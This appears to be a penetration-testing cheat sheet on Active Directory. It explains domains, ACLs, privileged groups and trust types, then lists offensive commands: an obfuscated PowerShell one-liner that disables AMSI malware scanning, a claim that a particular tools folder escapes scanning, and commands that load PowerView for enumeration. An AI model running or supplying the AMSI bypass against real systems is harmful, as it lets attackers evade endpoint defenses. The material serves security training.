# Active Directory

### Elements

* Schema: definition of an object and its properties
* Global catalog (DC): provides information about all objects in the directory
* Replication Service: synchronizes information about objects between all Domain Controllers
* Forest: a security boundary that includes several domains
* Domain: identified as a SID, contains several Organization Units
* Organization Unit (OU): the smallest container within a domain. Can be used to store users, groups or computers.

### Access control

Performed through a combination of token containing identity and privileges of user and security descriptors of the targeted object which include:

* SID: security identity of the owner of object
* DACL: discretionary ACL - access permissions of the client on the object
* SASL: system ACL - logging and audit policies by user
* ACE: access control entity - the single access rule that composes the list of rules used by DACL and SACL to manage accesses

### User groups

| ID  | Name               | Description                                                             |
| --- | ------------------ | ----------------------------------------------------------------------- |
| 512 | Domain Admins      | Grants administrative privilege over the whole domain                   |
| 549 | Server Operators   | Grants administrative privilege on the DC                               |
| 551 | Backup Operators   | Allows to access any file regardless of permission and performs backups |
| 548 | Account Operators  | Allows to create or edit user accounts                                  |
| 513 | Domain Users       | Includes all users                                                      |
| 515 | Domain Computers   | Includes all machine accounts                                           |
| 516 | Domain Controllers | Includes all DCs                                                        |

### Trust

Link between two domains that allows objects to share information. Can occur between father/child or horizontally across the forest boundary.&#x20;

* One Way trust: users in the trusted domain can access resources on the trusting domain but the reverse is not true
* Bi-directional trust: users in mutually trusting forests can share and access to both domains
* External: bi-directional and non transitive trust between domains on different forests
* Default:  two-way transitive trust between father-child elements
* Forest: trust established between root elements of forest. Can be one or two ways, transitive or non transitive
* Shortcut: can be one or two way, used to ease communications within large structures

Bidirectional Default trusts can always be enumerated



### AMSI Bypass

Obfuscated strings to disable AMSI PowerShell protection

```
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
```

### Including External Scripts

By storing PS1 scripts under C:\AD\Tools they will not be scanned&#x20;

#### PowerView

```
. .\PowerView.ps1
```

#### LDAP Module

```
Import-Module .\Microsoft\ActiveDirectory.Management.dll
Import-Module .\ActiveDirectory\ActiveDirectory.psdl
```
